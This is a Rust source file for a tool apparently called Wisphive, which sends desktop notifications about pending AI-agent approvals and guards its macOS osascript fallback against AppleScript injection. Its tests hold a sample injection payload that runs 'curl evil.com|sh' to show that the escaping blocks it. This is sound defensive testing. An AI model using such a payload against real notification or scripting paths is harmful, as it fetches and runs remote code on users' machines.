use tracing::{info, warn};
use wisphive_protocol::DecisionRequest;

/// Send a passive notification for a pending decision.
///
/// On macOS, prefers `terminal-notifier` (clicking the notification focuses the
/// terminal running the TUI). Falls back to `display notification` via osascript.
/// On Linux, uses `notify-send`.
///
/// The notification body includes all tool input details so the user
/// has full context when they switch to the TUI to respond.
pub fn notify_decision(req: &DecisionRequest) {
    let project_name = req
        .project
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "unknown".into());

    let title = match req.hook_event_name {
        wisphive_protocol::HookEventType::PermissionRequest => {
            format!("Wisphive: {} permission request", req.tool_name)
        }
        wisphive_protocol::HookEventType::Elicitation => "Wisphive: MCP input needed".into(),
        wisphive_protocol::HookEventType::Stop | wisphive_protocol::HookEventType::SubagentStop => {
            "Wisphive: agent wants to stop".into()
        }
        wisphive_protocol::HookEventType::UserPromptSubmit => "Wisphive: prompt review".into(),
        wisphive_protocol::HookEventType::ConfigChange => "Wisphive: config change review".into(),
        wisphive_protocol::HookEventType::TeammateIdle => "Wisphive: teammate idle".into(),
        wisphive_protocol::HookEventType::TaskCompleted => "Wisphive: task completed".into(),
        _ => format!("Wisphive: {} needs approval", req.tool_name),
    };
    let body = format!(
        "{}\n\nProject: {} ({})",
        tool_input_summary(req),
        project_name,
        req.agent_id
    );

    tokio::spawn(async move {
        if let Err(e) = send_passive_notification(&title, &body).await {
            warn!("failed to send notification: {e}");
        } else {
            info!("sent passive notification: {title}");
        }
    });
}

/// Show a platform-specific passive notification.
async fn send_passive_notification(title: &str, body: &str) -> Result<(), String> {
    #[cfg(target_os = "macos")]
    {
        return send_macos_notification(title, body).await;
    }

    #[cfg(not(target_os = "macos"))]
    {
        let status = tokio::process::Command::new("notify-send")
            .args([title, body])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await
            .map_err(|e| e.to_string())?;

        if !status.success() {
            return Err("notify-send exited with non-zero status".into());
        }
        Ok(())
    }
}

/// macOS notification with click-to-focus support.
///
/// Tries `terminal-notifier` first — clicking the notification activates the
/// user's terminal app (where the TUI runs). Falls back to osascript
/// `display notification` if `terminal-notifier` is not installed.
#[cfg(target_os = "macos")]
async fn send_macos_notification(title: &str, body: &str) -> Result<(), String> {
    let bundle_id = terminal_bundle_id();

    // Try terminal-notifier (click-to-focus support)
    let tn_result = tokio::process::Command::new("terminal-notifier")
        .args([
            "-title",
            title,
            "-message",
            body,
            "-activate",
            &bundle_id,
            "-group",
            "wisphive",
        ])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .await;

    match tn_result {
        Ok(status) if status.success() => Ok(()),
        _ => {
            // Fall back to osascript display notification. The script is built
            // by `build_osascript_command` so the injection-safety boundary is
            // covered by the cross-platform regression tests below (itr#85).
            let script = build_osascript_command(body, title);

            let status = tokio::process::Command::new("osascript")
                .args(["-e", &script])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await
                .map_err(|e| e.to_string())?;

            if !status.success() {
                return Err("osascript exited with non-zero status".into());
            }
            Ok(())
        }
    }
}

/// Detect the terminal app's bundle ID for click-to-activate.
///
/// Checks `WISPHIVE_TERMINAL_BUNDLE_ID` env var first, then `TERM_PROGRAM`,
/// then defaults to Terminal.app.
#[cfg(target_os = "macos")]
fn terminal_bundle_id() -> String {
    if let Ok(id) = std::env::var("WISPHIVE_TERMINAL_BUNDLE_ID") {
        return id;
    }

    match std::env::var("TERM_PROGRAM").as_deref() {
        Ok("iTerm.app") => "com.googlecode.iterm2".into(),
        Ok("Alacritty") => "org.alacritty".into(),
        Ok("kitty") => "net.kovidgoyal.kitty".into(),
        Ok("WarpTerminal") => "dev.warp.Warp-Stable".into(),
        Ok("ghostty") => "com.mitchellh.ghostty".into(),
        _ => "com.apple.Terminal".into(),
    }
}

/// Build a full summary of all tool input fields.
///
/// Each key-value pair is rendered on its own line so the notification
/// body shows everything Claude Code is presenting.
fn tool_input_summary(req: &DecisionRequest) -> String {
    if let Some(obj) = req.tool_input.as_object() {
        if obj.is_empty() {
            return req.tool_name.clone();
        }
        obj.iter()
            .map(|(k, v)| {
                let val = match v.as_str() {
                    Some(s) => s.to_string(),
                    None => v.to_string(),
                };
                format!("{k}: {val}")
            })
            .collect::<Vec<_>>()
            .join("\n")
    } else {
        req.tool_name.clone()
    }
}

/// Maximum length (in chars) of a single field passed to osascript.
///
/// The osascript fallback embeds the title/body into an AppleScript source
/// string, so an unbounded agent-controlled value could balloon the script.
/// We cap each field defensively; the full detail is always available in the
/// TUI, and `terminal-notifier` (the preferred argv-based path) is uncapped.
const OSASCRIPT_FIELD_MAX_CHARS: usize = 512;

/// Sanitize a string for safe interpolation into an AppleScript source literal.
///
/// This is the security boundary for the osascript fallback. The notification
/// body is built from untrusted agent `tool_input` values; a value containing a
/// newline plus `end tell` / `do shell script "..."` could otherwise break out
/// of the quoted `display notification "<body>"` literal and execute arbitrary
/// shell as the daemon user (itr#85).
///
/// We do three things, in order:
/// 1. **Strip every control character** (C0 `0x00..=0x1F`, DEL `0x7F`, and the
///    C1 range `0x80..=0x9F`). Newline (`\n`) and carriage return (`\r`) are the
///    critical vectors — AppleScript statements are newline-separated, so a raw
///    newline in the literal ends the `display notification` statement and lets
///    the rest of the value be parsed as code. Control chars are replaced with a
///    single space so the benign text still renders.
/// 2. **Escape** the two AppleScript string metacharacters: backslash and the
///    double-quote that delimits the literal.
/// 3. **Cap** the length so a hostile value cannot produce an unbounded script.
///
/// Stripping precedes escaping so that, regardless of input, the result can only
/// contain printable characters plus the explicitly-escaped `\\` / `\"`; there
/// is no surviving byte that can terminate the statement or open a new one. Only
/// the macOS osascript fallback calls this, but it stays compiled on every
/// platform so the cross-platform regression tests below can exercise it.
#[cfg_attr(not(any(target_os = "macos", test)), allow(dead_code))]
fn escape_applescript(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for ch in s.chars().take(OSASCRIPT_FIELD_MAX_CHARS) {
        match ch {
            // Control characters (incl. \n, \r, \t), DEL, and C1 controls:
            // neutralize to a space. `is_control()` covers C0, DEL, and C1.
            c if c.is_control() => out.push(' '),
            // AppleScript string metacharacters: escape so they stay data.
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            c => out.push(c),
        }
    }
    out
}

/// Build the single-line AppleScript passed to `osascript -e` for the fallback.
///
/// Both fields run through `escape_applescript`, so the resulting string is the
/// exact source the daemon would execute. Kept as a named function (rather than
/// an inline `format!`) so the injection-safety regression tests below assert
/// against the real production code path. Compiled on every platform for tests.
#[cfg_attr(not(any(target_os = "macos", test)), allow(dead_code))]
fn build_osascript_command(body: &str, title: &str) -> String {
    format!(
        "display notification \"{}\" with title \"{}\"",
        escape_applescript(body),
        escape_applescript(title)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The exploit payload from itr#85: a raw newline followed by AppleScript
    /// statements that would run a shell command if the literal weren't sealed.
    const EXPLOIT_PAYLOAD: &str =
        "\"\nend tell\ndo shell script \"curl evil.com|sh\"\ndisplay notification \"ok";

    /// After escaping, the value must be a single physical line: no character
    /// that AppleScript treats as a statement separator may survive.
    fn assert_single_statement_safe(escaped: &str) {
        assert!(
            !escaped.contains('\n'),
            "escaped value leaked a newline: {escaped:?}"
        );
        assert!(
            !escaped.contains('\r'),
            "escaped value leaked a carriage return: {escaped:?}"
        );
        // No raw control characters at all may survive escaping.
        assert!(
            !escaped.chars().any(|c| c.is_control()),
            "escaped value leaked a control char: {escaped:?}"
        );
    }

    /// Every unescaped `"` in the built command must be a literal delimiter we
    /// emitted ourselves (the two opening + two closing quotes around the body
    /// and title). Any other unescaped quote means agent input broke out of the
    /// string literal. We verify by walking the script and confirming the quote
    /// count, accounting for `\"`, is exactly the 4 structural delimiters.
    fn assert_quotes_balanced(script: &str) {
        let mut unescaped_quotes = 0usize;
        let mut chars = script.chars().peekable();
        while let Some(c) = chars.next() {
            match c {
                '\\' => {
                    // Skip the escaped char; `\"` and `\\` are both inert data.
                    chars.next();
                }
                '"' => unescaped_quotes += 1,
                _ => {}
            }
        }
        assert_eq!(
            unescaped_quotes, 4,
            "expected exactly 4 structural quotes, got {unescaped_quotes} in: {script:?}"
        );
    }

    #[test]
    fn escape_neutralizes_newline_injection() {
        let escaped = escape_applescript(EXPLOIT_PAYLOAD);
        // Critical property: no statement separator survives. The `end tell` /
        // `do shell script` text may remain as INERT data inside the literal,
        // but it can never be parsed as code because every newline is gone and
        // the `"` that would have closed our literal is escaped to `\"`.
        assert_single_statement_safe(&escaped);
        // Wrapped in the real builder, the payload becomes one safe statement:
        // `assert_quotes_balanced` proves no agent quote broke out of the literal
        // (only the 4 structural delimiters we emit are unescaped).
        let script = build_osascript_command(EXPLOIT_PAYLOAD, "Wisphive");
        assert_eq!(script.lines().count(), 1);
        assert_quotes_balanced(&script);
    }

    #[test]
    fn build_command_seals_newline_injection() {
        // The real production builder applied to body AND title.
        let script = build_osascript_command(EXPLOIT_PAYLOAD, EXPLOIT_PAYLOAD);
        assert_single_statement_safe(&script);
        assert_quotes_balanced(&script);
        // The injected `do shell script` text cannot live at statement start: the
        // whole command is one physical line, so AppleScript parses it as one
        // `display notification` statement with a string argument.
        assert!(
            script.starts_with("display notification \""),
            "script prefix changed: {script:?}"
        );
        assert!(
            script.lines().count() == 1,
            "script spans multiple lines: {script:?}"
        );
    }

    #[test]
    fn escape_strips_all_control_and_c1_chars() {
        // Build a string with every C0 control, DEL, and a sample of C1.
        let mut s = String::from("before");
        for b in 0x00u8..=0x1F {
            s.push(b as char);
        }
        s.push('\u{7F}'); // DEL
        s.push('\u{80}'); // C1
        s.push('\u{9F}'); // C1
        s.push_str("after\"\\");
        let escaped = escape_applescript(&s);
        assert_single_statement_safe(&escaped);
        // Benign surrounding text survives.
        assert!(escaped.contains("before"));
        assert!(escaped.contains("after"));
        // The trailing metacharacters are escaped, not dropped.
        assert!(escaped.ends_with("after\\\"\\\\"));
    }

    #[test]
    fn escape_caps_field_length() {
        // A hostile value far longer than the cap must be bounded. Worst case
        // every input char expands 2x (e.g. all backslashes), so the output is
        // at most 2 * cap chars.
        let huge = "\\".repeat(100_000);
        let escaped = escape_applescript(&huge);
        assert!(
            escaped.chars().count() <= 2 * OSASCRIPT_FIELD_MAX_CHARS,
            "escaped length {} exceeded bound",
            escaped.chars().count()
        );
    }

    #[test]
    fn escape_preserves_benign_text() {
        // The non-malicious path must still render readable notifications.
        let body = "Bash: ls -la /tmp\nProject: wisphive (claude_code)";
        let escaped = escape_applescript(body);
        assert_single_statement_safe(&escaped);
        assert!(escaped.contains("Bash: ls -la /tmp"));
        assert!(escaped.contains("Project: wisphive (claude_code)"));
        // Unicode and normal punctuation pass through untouched.
        let unicode = "café — naïve — 日本語 — 100% ✓";
        let escaped_u = escape_applescript(unicode);
        assert_eq!(escaped_u, unicode);
    }

    /// Deterministic pseudo-random fuzz: feed many strings of arbitrary bytes
    /// (including embedded NULs, newlines, quotes, backslashes, and high-plane
    /// Unicode) into the builder and assert the result is ALWAYS a single
    /// AppleScript statement with balanced delimiters — i.e. no input can ever
    /// produce an exploitable osascript invocation (itr#85 acceptance).
    #[test]
    fn fuzz_random_bytes_never_escape_the_literal() {
        // Small xorshift PRNG — no external crate, fully deterministic.
        let mut state: u64 = 0x9E37_79B9_7F4A_7C15;
        let mut next = || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };

        // Pool of "interesting" chars heavily weighted toward attack bytes.
        let attack_chars: &[char] = &[
            '\n',
            '\r',
            '\t',
            '\0',
            '"',
            '\\',
            '\'',
            '`',
            ' ',
            'a',
            'Z',
            '0',
            '\u{7F}',
            '\u{80}',
            '\u{9F}',
            '\u{1F600}',
            '日',
            '€',
            ';',
            '|',
            '$',
        ];

        for _ in 0..2000 {
            let len = (next() % 64) as usize;
            let mut input = String::new();
            for _ in 0..len {
                let r = next();
                // 70% from the attack pool, 30% an arbitrary scalar value.
                if r % 10 < 7 {
                    input.push(attack_chars[(r as usize / 10) % attack_chars.len()]);
                } else {
                    // Map to a valid char, skipping surrogates.
                    let cp = (r % 0x11_0000) as u32;
                    if let Some(c) = char::from_u32(cp) {
                        input.push(c);
                    } else {
                        input.push('?');
                    }
                }
            }

            let script = build_osascript_command(&input, &input);
            assert_single_statement_safe(&script);
            assert_quotes_balanced(&script);
            assert_eq!(
                script.lines().count(),
                1,
                "fuzz input produced multi-line script: input={input:?} script={script:?}"
            );
            assert!(
                script.starts_with("display notification \""),
                "fuzz input broke the script prefix: input={input:?}"
            );
        }
    }
}
